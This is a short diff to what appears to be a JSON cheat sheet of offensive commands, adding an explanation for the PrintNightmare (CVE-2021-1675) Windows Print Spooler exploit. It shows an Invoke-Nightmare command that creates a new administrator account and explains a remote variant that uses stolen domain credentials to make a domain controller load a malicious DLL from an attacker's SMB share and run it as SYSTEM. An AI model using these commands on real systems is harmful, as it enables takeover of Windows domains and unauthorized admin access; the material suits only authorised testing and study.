@@ -89,5 +89,6 @@
       "label": "Local (add admin)",
       "command": "Invoke-Nightmare -NewUser <user> -NewPassword <password>"
     }
-  ]
+  ],
+  "explain": "Loads an attacker DLL as SYSTEM via the Print Spooler bug (CVE-2021-1675), remotely:\n  CVE-2021-1675.py         the impacket-based exploit\n  <domain>/<user>:<password>@<dc_ip>   authenticated domain creds and the target\n  '\\\\<attacker_ip>\\smb\\shell.dll'   UNC path to your malicious driver DLL on an SMB share\nThe spooler installs the driver and executes your DLL as SYSTEM. Invoke-Nightmare is the local PowerShell variant that just adds an admin."
 }
